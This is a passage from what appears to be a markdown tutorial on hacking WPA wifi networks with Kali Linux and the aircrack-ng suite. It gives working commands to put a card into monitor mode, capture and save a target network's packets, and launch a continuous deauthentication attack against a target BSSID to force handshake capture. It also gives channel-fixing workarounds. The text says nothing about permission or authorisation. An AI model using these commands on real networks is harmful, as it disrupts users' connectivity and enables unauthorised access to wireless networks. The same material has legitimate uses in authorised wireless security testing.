    \ machines can't use internal wireless cards and you will have to use external\
    \ cards. You should try booting Kali using Live USB (just look at the first part\
    \ of this tutorial), or buy an external card.\n\n### 2. Enable Monitor mode\n\
    Now, we use a tool called `airmon-ng` to create a virtual interface called `mon`.\
    \ Just type:\n```bash\nairmon-ng start wlan0\n```\nYour `mon0` interface will\
    \ be created.\n\n### 3. Start capturing packets\nNow, we'll use `airodump-ng`\
    \ to capture the packets in the air. This tool gathers data from the wireless\
    \ packets in the air. You'll see the name of the wifi you want to hack.\n```bash\n\
    airodump-ng mon0\n```\n\n### 4. Store the captured packets in a file\nThis can\
    \ be achieved by giving some more parameters with the `airodump` command:\n```bash\n\
    airodump-ng mon0 --write name_of_file\n```\n\nExample:\n```bash\nroot@kali:~#\
    \ airmon-ng start wlan1\nroot@kali:~# airodump-ng mon0 -w anynamehere\n```\n\n\
    Now copy the `bssid` field of your target network (from `airodump-ng` screen)\
    \ and launch a deauth attack with `aireplay-ng`:\n```bash\nroot@kali:~# aireplay-ng\
    \ --deauth 0 -a BSSID here mon0\n```\nThe `--deauth` tells `aireplay` to launch\
    \ a deauth attack. `0` tell it to fire it at interval of 0 secs (very fast so\
    \ run it only for a few secs and press `ctrl+c`). `-a` will required BSSID and\
    \ replace `BSSID here` with your target BSSID. `mon0` is the interface you created.\n\
    \nIn case you face problems with the monitor mode hopping from one channel to\
    \ another, or problem with beacon frame, then fix `mon0` on a channel using:\n\
    ```bash\nroot@kali:~# airodump-ng mon0 -w anynamehere -c 1\n```\nReplace `1` with\
    \ the channel where your target AP is. You might also need to add `--ignorenegative-one`\
    \ if `aireplay` demands it. In my case `airodump-ng` says fixed channel `mon0`:\
    \ -1 so this was required (It's a bug with `aircrack-ng` suite).\n\nNow when you\
    \ look at the `airodump-ng` screen, you'll see that at the top right it says `WPA\
